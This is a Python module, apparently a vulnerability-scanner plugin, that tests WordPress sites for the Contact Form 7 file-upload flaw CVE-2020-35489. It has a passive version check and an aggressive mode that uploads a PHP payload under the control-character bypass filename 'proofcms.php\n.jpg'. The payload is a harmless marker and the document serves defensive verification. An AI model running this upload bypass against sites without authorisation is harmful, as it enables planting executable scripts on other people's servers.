from __future__ import annotations

import re
from typing import Any

from ...core.crawl import crawl_pages
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2020-35489"
NAME = "Contact Form 7 unrestricted file upload"
COMPONENT = "WordPress plugin Contact Form 7"
AFFECTED_RULE = "Contact Form 7 before 5.3.2"
PLUGIN_SLUG = "contact-form-7"
PATCHED_VERSION = "5.3.2"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
BASELINE_FILENAME = "proofcms.php"
# A control character between the script extension and the allowed extension
# evades the 5.3.1 filter.  The 5.3.2 fix strips \pC and \pZ characters.
BYPASS_FILENAME = "proofcms.php\n.jpg"
COMMON_PATHS = ("/", "/contact/", "/contact-us/", "/support/", "/about/")
MAX_CRAWL_PAGES = 20
SKIP_LINK_MARKERS = (
    "/wp-admin",
    "/wp-login",
    "wp-json",
    "xmlrpc.php",
    "?feed=",
    "/feed/",
    "mailto:",
    "javascript:",
    "#",
    ".css",
    ".js",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".svg",
    ".ico",
)


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe(PATCHED_VERSION)
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade Contact Form 7 to 5.3.2 or newer and review upload directories.",
        exploit_available=HAS_EXPLOIT,
    )


def _attr(tag: str, name: str) -> str | None:
    match = re.search(rf'{re.escape(name)}=["\']([^"\']*)["\']', tag, re.IGNORECASE)
    return match.group(1) if match else None


def _inputs(html: str) -> dict[str, dict[str, str]]:
    result: dict[str, dict[str, str]] = {}
    for match in re.finditer(r"<input\b[^>]*>", html, re.IGNORECASE):
        tag = match.group(0)
        name = _attr(tag, "name")
        if not name:
            continue
        result[name] = {
            "value": _attr(tag, "value") or "",
            "type": (_attr(tag, "type") or "text").lower(),
        }
    return result


def parse_cf7_form(html: str) -> dict[str, Any] | None:
    inputs = _inputs(html)
    if "_wpcf7" not in inputs:
        return None
    file_field = next(
        (name for name, details in inputs.items() if details["type"] == "file"),
        None,
    )
    if not file_field:
        return None
    hidden = {
        name: details["value"]
        for name, details in inputs.items()
        if name.startswith("_wpcf7") or name in {"_wpnonce", "_wp_http_referer"}
    }
    fillable = {
        name: "ProofCMS"
        for name, details in inputs.items()
        if not name.startswith("_") and details["type"] in {"text", "email", "tel", "url", "search", "number"}
    }
    return {"hidden": hidden, "file_field": file_field, "fill": fillable}


def _candidate_urls(sess: HttpSession, base: str) -> list[str]:
    return crawl_pages(
        lambda url: sess.get(url, timeout=8),
        base,
        common_paths=COMMON_PATHS,
        max_pages=MAX_CRAWL_PAGES,
        skip_markers=SKIP_LINK_MARKERS,
    )


def _discover_form(
    sess: HttpSession,
    base: str,
    form_url: str | None = None,
) -> tuple[str, dict[str, Any]] | None:
    urls = [form_url] if form_url else _candidate_urls(sess, base)
    for url in urls:
        if not url:
            continue
        response = sess.get(url, timeout=8)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        form = parse_cf7_form(str(response.get("body", "")))
        if form:
            return url, form
    return None


def _classify_response(body: str) -> str:
    lowered = body.lower()
    if "not allowed to upload files of this type" in lowered:
        return "REJECTED_FILE_TYPE"
    if "unknown error uploading the file" in lowered:
        return "UPLOAD_ERROR"
    if (
        "thank you for your message" in lowered
        or "error trying to send your message" in lowered
        or 'data-status="mail_sent"' in lowered
        or 'data-status="mail_failed"' in lowered
    ):
        return "ACCEPTED"
    if "one or more fields have an error" in lowered:
        return "VALIDATION_ERROR"
    return "UNKNOWN"


def _submit(
    sess: HttpSession,
    url: str,
    form: dict[str, Any],
    filename: str,
) -> dict[str, Any]:
    fields = dict(form["hidden"])
    fields.update(form["fill"])
    return sess.post_multipart(
        url,
        fields=fields,
        files={form["file_field"]: (filename, b'<?php echo "CF7_" . (7 * 7); ?>', "image/jpeg")},
    )


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    form_url: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    found = _discover_form(sess, base, form_url=form_url)
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="No Contact Form 7 form with a file upload field was found on the reachable pages.",
            action="Manually verify a CF7 form with a file field and upgrade to 5.3.2 or newer.",
        )

    page_url, form = found
    baseline = _submit(sess, page_url, form, BASELINE_FILENAME)
    if is_transport_error(baseline):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"Baseline upload could not obtain an HTTP response ({transport_error_detail(baseline)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )
    baseline_result = _classify_response(str(baseline.get("body", "")))
    if baseline_result != "REJECTED_FILE_TYPE":
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=page_url,
            detail=(
                "The baseline .php upload was not rejected, so the form's filter cannot be "
                f"distinguished from an intentional configuration (result: {baseline_result})."
            ),
            action="Verify the form's filetypes setting and upgrade Contact Form 7 to 5.3.2 or newer.",
            evidence={"form_url": page_url, "baseline": baseline_result},
        )

    bypass = _submit(sess, page_url, form, BYPASS_FILENAME)
    if is_transport_error(bypass):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"Bypass upload could not obtain an HTTP response ({transport_error_detail(bypass)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )
    bypass_result = _classify_response(str(bypass.get("body", "")))
    evidence = {
        "form_url": page_url,
        "file_field": form["file_field"],
        "baseline_filename": BASELINE_FILENAME,
        "baseline_result": baseline_result,
        "bypass_filename": BYPASS_FILENAME,
        "bypass_result": bypass_result,
    }

    if bypass_result == "ACCEPTED":
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=page_url,
            detail=(
                "Contact Form 7 accepted a control-character filename that bypasses its script-extension "
                "filter, while the same form rejected a plain .php filename. This confirms the filter "
                "bypass on the version-gated target; 5.3.2 also accepts the upload but sanitizes the saved "
                "filename, so the probe is not a standalone version discriminator. CF7 deletes temporary "
                "uploads after submission, so persistent execution was not proven."
            ),
            action="Upgrade Contact Form 7 to 5.3.2 or newer and review upload storage integrations.",
            evidence=evidence,
        )

    if bypass_result == "UPLOAD_ERROR":
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=page_url,
            detail="The bypass filename passed the type check, but the upload directory rejected the write.",
            action="Verify upload directory permissions and upgrade Contact Form 7 to 5.3.2 or newer.",
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=page_url,
        detail=f"The control-character bypass filename was not accepted (result: {bypass_result}).",
        action="Upgrade Contact Form 7 to 5.3.2 or newer and review the form's file-type settings.",
        evidence=evidence,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only upload verification."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Aggressive proof skipped because Contact Form 7 was not detected as potentially affected."
        return passive
    result = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        form_url=aggressive_command,
    )
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<5.3.2"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2020-35489",
            "https://contactform7.com/2020/12/17/contact-form-7-532/",
            "https://www.jinsonvarghese.com/unrestricted-file-upload-in-contact-form-7/",
        ],
    }
